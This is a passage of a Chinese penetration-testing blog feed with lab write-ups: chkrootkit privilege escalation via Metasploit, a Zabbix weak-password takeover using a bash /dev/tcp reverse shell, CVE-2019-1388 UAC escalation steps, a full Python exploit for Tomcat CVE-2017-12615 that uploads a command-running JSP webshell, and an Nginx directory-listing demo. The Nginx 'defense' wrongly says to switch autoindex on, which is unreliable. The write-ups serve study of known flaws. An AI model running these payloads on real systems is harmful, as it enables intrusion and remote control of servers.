class="built_in">local</span>/chkrootkit</span><br><span class="line">   Platform: Unix</span><br><span class="line">       Arch: cmd</span><br><span class="line"> Privileged: Yes</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Manual</span><br><span class="line">  Disclosed: 2014-06-04</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Thomas Stangner</span><br><span class="line">  Julien <span class="string">&quot;jvoisin&quot;</span> Voisin</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name        Current Setting       Required  Description</span><br><span class="line">  ----        ---------------       --------  -----------</span><br><span class="line">  CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit</span><br><span class="line">  SESSION                           yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  Chkrootkit before 0.50 will run any executable file named </span><br><span class="line">  /tmp/update as root, allowing a trivial privilege escalation. </span><br><span class="line">  WfsDelay is <span class="built_in">set</span> to 24h, since this is how often a chkrootkit scan is </span><br><span class="line">  scheduled by default.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://cvedetails.com/cve/CVE-2014-0476/</span><br><span class="line">  OSVDB (107710)</span><br><span class="line">  https://www.exploit-db.com/exploits/33899</span><br><span class="line">  http://www.securityfocus.com/bid/67813</span><br><span class="line">  https://cwe.mitre.org/data/definitions/20.html</span><br><span class="line">  https://seclists.org/oss-sec/2014/q2/430</span><br></pre></td></tr></table></figure><h3 id="Chkrootkit提权"><a href="#Chkrootkit提权" class="headerlink" title="Chkrootkit提权"></a>Chkrootkit提权</h3><p>这个模块就是利用 <code>chkrootkit</code> 漏洞:<code>chkrootkit</code> 有 <code>crontab</code>，会定期以 <code>root</code> 身份执行 <code>/tmp/update</code> 文件。如果攻击者知道管理员是定期运行chkrootkit(通过查看cron.daily获知)，并且对<code>/tmp</code>(没有挂载<code>noexec</code>)有写访问权限，就可以利用该漏洞获取root权限</p><p>目标机先查看一下：<code>tmp/logs</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/641.png" alt="图片"></p><p>接着运行模块：<code>exploit</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/642.png" alt="图片"></p><p>然后在末尾输入一段 <code>python</code> 脚本获取 <code>ROOT</code> 会话：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/643.png" alt="图片"></p><h2 id="拿到ROOT和final-txt的banner"><a href="#拿到ROOT和final-txt的banner" class="headerlink" title="拿到ROOT和final.txt的banner"></a>拿到ROOT和final.txt的banner</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/644.png" alt="图片"></p><p>最后也是拿到了 <code>root</code> 权限和 <code>final</code> 的banner~</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次渗透呢先是扫描内网主机存活，然后找到了 <code>192.168.136.140</code> 这台靶机的 <code>IP</code>，接着呢是在 <code>HTTP</code> 服务找到了一段 <code>ROT13</code> 的加密后的文本，后来用<code>Wireshark</code>打开后分析数据包得到<code>FTP</code>账号密码，通过生成<code>SSH</code>密匙来登陆目标主机的<code>SSH</code>，最后使用 <code>Chkrootkit</code> 来进行了提权操作。</p><p>自己还是太菜了，全部搞完都已经快凌晨3点了，总共花了4个多小时才完成这次渗透测试，继续学习吧</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Metasploit </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zabbix-弱口令再到命令执行Getshell</title>
      <link href="/2019/11/29/penetrationtest-8/"/>
      <url>/2019/11/29/penetrationtest-8/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=4416697&auto=1&height=66"></iframe><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>先是枚举了一下目录：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/602.png" alt="图片"></p><p>得到了一些可利用的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[06:13:52] 200 -   86KB - /phpinfo.php</span><br><span class="line">[06:13:56] 200 -    2KB - /setup.php</span><br><span class="line">[06:14:01] 200 -    2KB - /users.php</span><br></pre></td></tr></table></figure><p><code>phpinfo</code>中可以得到一些信息：用的是<code>Linux</code>操作系统:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/603.png" alt="图片"></p><p>通过<code>DOCUMENT_ROOT</code>函数得知网站的绝对路径是<code>/opt/httpd-2.4.29/htdocs</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/604.png" alt="图片"></p><p>接着来到：<code>http://xx.xx.xx.xx/setup.php</code>，是一个安装页面，不管他。要是我重新给他安装了web，我估计第二天就能去警察叔叔那里喝茶谈人生了</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/605.png" alt="图片"></p><p>第三个页面是：<code>http://xx.xx.xx.xx/users.php</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/606.png" alt="图片"></p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>掏出我的<code>BurpSuite</code>+大字典集合得到账号密码为：<code>admin / zabbix</code> 进入到了后台：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/607.png" alt="图片"></p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>在管理-脚本-创建脚本写入反弹<code>shell</code>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/0.0.0.0/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/608.png" alt="图片"></p><p>在监测-问题处打开一个主机，然后找到刚刚创建的脚本<code>power-liu</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/609.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/610.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/611.png" alt="图片"></p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 弱口令 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows证书对话框权限提升-CVE-2019-1388</title>
      <link href="/2019/11/27/CVE-2019-1388/"/>
      <url>/2019/11/27/CVE-2019-1388/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1363045964&auto=1&height=66"></iframe><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><blockquote><p> 用windows系统的guest来宾用户提权到system系统用户</p></blockquote><p>  该Bug可在<code>UAC</code>(用户帐户控制)机制中找到。默认情况下，Windows在称为“安全桌面”的单独桌面上显示所有UAC提示。提示本身是由名为的可执行文件生成的，该可执行文件以<code>System</code>的完整性级别<code>consent.exe</code>运行<code>NT AUTHORITY\SYSTEM</code>。由于用户可以与此<code>UI</code>进行交互，因此有必要对UI进行严格限制。否则，低特权用户可能能够通过UI操作的<code>circuit</code>回路径以SYSTEM的身份执行操作。即使是孤立地看起来无害的单独UI功能也可能是导致任意控制的一系列动作的第一步。确实，您会发现UAC对话框已被精简，仅包含最少的可单击选项。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">SERVER</span><br><span class="line">======</span><br><span class="line"></span><br><span class="line">Windows 2008r27601** link OPENED AS SYSTEM **</span><br><span class="line">Windows 2012r29600** link OPENED AS SYSTEM **</span><br><span class="line">Windows 201614393** link OPENED AS SYSTEM **</span><br><span class="line">Windows 201917763link NOT opened</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WORKSTATION</span><br><span class="line">===========</span><br><span class="line"></span><br><span class="line">Windows 7 SP17601** link OPENED AS SYSTEM **</span><br><span class="line">Windows 89200** link OPENED AS SYSTEM **</span><br><span class="line">Windows 8.19600** link OPENED AS SYSTEM **</span><br><span class="line">Windows 10 151110240** link OPENED AS SYSTEM **</span><br><span class="line">Windows 10 160714393** link OPENED AS SYSTEM **</span><br><span class="line">Windows 10 170315063link NOT opened</span><br><span class="line">Windows 10 170916299link NOT opened</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">复现靶机：Windows 7 Enterprise with Service Pack 1 (x64)</span><br><span class="line">EXP：https://github.com/jas502n/CVE-2019-1388</span><br></pre></td></tr></table></figure><p>这边是一个<code>Guest</code>来宾用户，下面演示如何从普通用户提升为<code>SYSTEM</code>权限！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/591.png" alt="图片"></p><p>右键-以管理员身份运行：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/592.png" alt="图片"></p><p>这个时候会弹出<code>UAC</code>，不用管它，点击：显示详细信息</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/593.png" alt="图片"></p><p>然后点击蓝色字体：显示有关此发布者的证书信息</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/594.png" alt="图片"></p><p>来到证书信息这里，点击颁发着那串蓝色链接：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/595.png" alt="图片"></p><p>这个时候就会使用默认的浏览器打开一个页面：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/596.png" alt="图片"></p><p>页面–&gt;另存为：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/597.png" alt="图片"></p><p>这个时候弹出了一个”位置不可用”，不用管它，关闭就行：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/598.png" alt="图片"></p><p>在路径输入：<code>C:\Windows\System32\cmd.exe</code>，然后回车就弹出一个<code>cmd</code>窗口：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/599.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/600.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/601.png" alt="图片"></p><p>可以看到，现在是<code>SYSTEM</code>系统权限！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat-远程代码执行漏洞</title>
      <link href="/2019/11/26/Tomcat-1/"/>
      <url>/2019/11/26/Tomcat-1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1516737&auto=1&height=66"></iframe><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><code>Tomcat</code>的<code>Servlet</code>是在<code>conf/web.xml</code>配置的，通过配置文件可知，当后缀名为<code>.jsp</code>和<code>.jspx</code>的时候<br>是通过<code>JspServlet</code>处理请求的,而其他的精通文件是通过<code>DefaultServlet</code>处理的<br>可以得知：<code>&quot;1.jsp &quot;</code>(末尾有一个空格)并不能匹配到<code>JspServlet</code>，而是会交由<code>DefaultServlet</code>去处理<br>当处理<code>PUT</code>请求时：<br>会调用<code>resources.bind:dirContext</code>为FileDirContext:调用rebind创建文件<br>又由于Windows不允许<code>&quot; &quot;</code>(空格)作为文件名结尾，所以会创建一个<code>&quot;.jsp&quot;</code>文件，导致代码执行</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">漏洞靶机 Win 2003x64 ：192.168.136.136</span><br><span class="line">PC主机（Python环境） ：192.168.1.103</span><br><span class="line">漏洞存在范围：Tomcat-7.0.0-Tomcat-7.0.81</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/580.png" alt="图片"></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">win 2003x64 安装 Java环境</span><br><span class="line"></span><br><span class="line">Tomcat7.0.75下载：http://archive.apache.org/dist/tomcat/tomcat-7/v7.0.75/bin/apache-tomcat-7.0.75.exe</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/581.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/582.png" alt="图片"></p><h3 id="开启HTTP-PUT"><a href="#开启HTTP-PUT" class="headerlink" title="开启HTTP PUT"></a>开启HTTP PUT</h3><p>找到<code>Tomcat</code>的安装目录下的<code>conf</code>的<code>web.xml</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/583.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/584.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">readonly            Is this context &quot;read only&quot;, so HTTP</span><br><span class="line">commands like PUT and DELETE are</span><br><span class="line"> rejected?  [true]   </span><br><span class="line"></span><br><span class="line">这个意思就是说：当前是只读模式，是不允许修改的 </span><br></pre></td></tr></table></figure><p>找到<code>org.apache.catalina.servlets.DefaultServlet</code>方法:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/585.png" alt="图片"></p><p>添加如下代码并保存：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line">&lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line">    &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">&lt;/init-param&gt;  </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/586.png" alt="图片"></p><p>修改完之后，重启Tomcat：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/587.png" alt="图片"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Python EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> httplib</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">body = <span class="string">&#x27;&#x27;&#x27;&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">+&quot;\\n&quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if(&quot;hacker&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);&#125;else&#123;out.println(&quot;Test By Power_Liu&quot;);&#125;%&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"> </span><br><span class="line">    conn = httplib.HTTPConnection(sys.argv[<span class="number">1</span>])</span><br><span class="line"> </span><br><span class="line">    conn.request(method=<span class="string">&#x27;OPTIONS&#x27;</span>, url=<span class="string">&#x27;/ffffzz&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    headers = <span class="built_in">dict</span>(conn.getresponse().getheaders())</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;allow&#x27;</span> <span class="keyword">in</span> headers <span class="keyword">and</span> \</span><br><span class="line">       headers[<span class="string">&#x27;allow&#x27;</span>].find(<span class="string">&#x27;PUT&#x27;</span>) &gt; <span class="number">0</span> :</span><br><span class="line"> </span><br><span class="line">        conn.close()</span><br><span class="line"> </span><br><span class="line">        conn = httplib.HTTPConnection(sys.argv[<span class="number">1</span>])</span><br><span class="line"> </span><br><span class="line">        url = <span class="string">&quot;/&quot;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(time.time()))+<span class="string">&#x27;.jsp/&#x27;</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">#url = &quot;/&quot; + str(int(time.time()))+&#x27;.jsp::$DATA&#x27;</span></span><br><span class="line"> </span><br><span class="line">        conn.request( method=<span class="string">&#x27;PUT&#x27;</span>, url= url, body=body)</span><br><span class="line"> </span><br><span class="line">        res = conn.getresponse()</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> res.status  == <span class="number">201</span> :</span><br><span class="line"> </span><br><span class="line">            <span class="comment">#print &#x27;shell:&#x27;, &#x27;http://&#x27; + sys.argv[1] + url[:-7]</span></span><br><span class="line"> </span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;shell:&#x27;</span>, <span class="string">&#x27;http://&#x27;</span> + sys.argv[<span class="number">1</span>] + url[:-<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">elif</span> res.status == <span class="number">204</span> :</span><br><span class="line"> </span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;file exists&#x27;</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"> </span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"> </span><br><span class="line">        conn.close()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Server not vulnerable&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">except</span> Exception,e:</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Error:&#x27;</span>, e</span><br></pre></td></tr></table></figure><p>运行Python-EXP脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 tomcat-CVE-<span class="number">2017</span>-<span class="number">12615.</span>py <span class="number">192.168</span><span class="number">.136</span><span class="number">.136</span>:<span class="number">8080</span></span><br><span class="line"></span><br><span class="line">得到的shell：http://<span class="number">192.168</span><span class="number">.136</span><span class="number">.136</span>:<span class="number">8080</span>/<span class="number">1574766773.j</span>sp</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/588.png" alt="图片"></p><p>得到一枚Webshell：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/589.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问：http://192.168.136.136:8080/1574766773.jsp?pwd=hacker&amp;cmd=ipconfig</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/590.png" alt="图片"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>将<code>Tomcat</code>更新到该漏洞被修复的版本（例如：Tomcat：8.5.23）<br><code>readonlyinit-param</code>不应该将<code>false</code>首先设置。如果该参数保留到默认（true），则攻击者无法上传文件。<br>最后可以在前端安装WAF等防护软件来阻止<code>PUT</code>和<code>DELETE</code>请求。</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx-目录遍历漏洞</title>
      <link href="/2019/11/19/Nginx-2/"/>
      <url>/2019/11/19/Nginx-2/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=502839372&auto=1&height=66"></iframe><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>目录遍历（路径遍历），是由于Web服务器或者Web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞，使得攻击者通过利用一些特殊字符就可以绕过服务器的安全现在，访问任意的文件（可以使Web根目录以为的文件），甚至执行系统命令。</p><p>程序在实现上没用充分过滤用户输入的<code>../</code>之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。</p><p><code>Nginx</code>的目录遍历与<code>Apache</code>一样，属于配置方面的问题，错误的配置可导致目录遍历与源码的泄露。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/572.png" alt="图片"></p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">实验机器2003 IP：192.168.136.129 + Phpstudy+Nginx+PHP5.2n</span><br><span class="line"></span><br><span class="line">PC物理主机IP：192.168.1.103</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/573.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/574.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/575.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/576.png" alt="图片"></p><p>这个时候可以看到，我创建了很多个目录，环境就搭建完毕！</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先访问这个url是没有目录遍历的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.136.129/789/123/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/577.png" alt="图片"></p><p>然后我们修改<code>Nginx</code>配置文件<code>nginx.conf</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">把：autoindex  off</span><br><span class="line">修改为：autoindex  on</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/578.png" alt="图片"><br>接着我们重启<code>phpstudy</code>重新打开URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.136.129/789/123/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/579.png" alt="图片"></p><p>这个时候就会有<code>目录遍历</code>漏洞了！</p><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>在<code>Nginx</code>的配置文件<code>nginx.conf</code>:<br>把<code>autoindex  off</code><br>修改为<code>autoindex  on</code><br>最后重启服务就好了~</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL注入原理剖析</title>
      <link href="/2019/11/06/SQL-1/"/>
      <url>/2019/11/06/SQL-1/</url>
      
